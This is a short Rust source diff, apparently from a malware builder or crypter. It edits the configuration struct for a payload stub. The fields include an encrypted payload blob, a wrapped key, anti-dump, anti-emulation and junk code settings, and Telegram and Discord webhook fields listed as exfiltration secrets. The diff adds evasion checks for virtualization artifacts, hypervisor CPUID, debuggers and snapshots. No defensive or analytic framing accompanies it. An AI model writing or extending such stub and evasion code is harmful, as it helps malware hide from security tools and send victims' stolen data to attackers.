@@ -12,17 +12,14 @@ pub struct StubProgram {
     pub execution: ExecutionMethod,
     pub key_material: KeyMaterial,
     pub payload_blob: Vec<u8>,
+    pub wrapped_key: [u8; 32],
     pub target_os: TargetOs,
-    /// XOR key for encrypting config-string blocklists in the stub
     pub config_xor_key: [u8; 32],
-    /// anti-dump: re-protect decrypted payload after use
     pub anti_dump: bool,
-    /// anti-emulation: sleep acceleration check
     pub anti_emulation: bool,
-    /// junk code injection density (0..1)
     pub junk_density: f32,
-
-    // ---- per-build exfil secrets (path 2) ----
+    pub build_id: String,
+    pub directive_json: String,
     pub telegram_token: String,
     pub telegram_chat: String,
     pub discord_webhook: String,
@@ -48,11 +45,14 @@ impl Default for StubProgram {
                 bind_to_code_hash: false,
             },
             payload_blob: Vec::new(),
+            wrapped_key: [0u8; 32],
             target_os: TargetOs::Windows,
             config_xor_key: [0u8; 32],
             anti_dump: false,
             anti_emulation: false,
             junk_density: 0.0,
+            build_id: String::new(),
+            directive_json: String::new(),
             telegram_token: String::new(),
             telegram_chat: String::new(),
             discord_webhook: String::new(),
@@ -74,6 +74,10 @@ pub enum Gate {
     SleepJitter { min_ms: u32, max_ms: u32 },
     SleepAccelerationCheck { sleep_ms: u64, min_ratio: f32 },
     ApiHammerCheck,
+    VirtualizationArtifacts,
+    HypervisorCpuid,
+    ParentDebugger,
+    SnapshotCheck,
 }
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
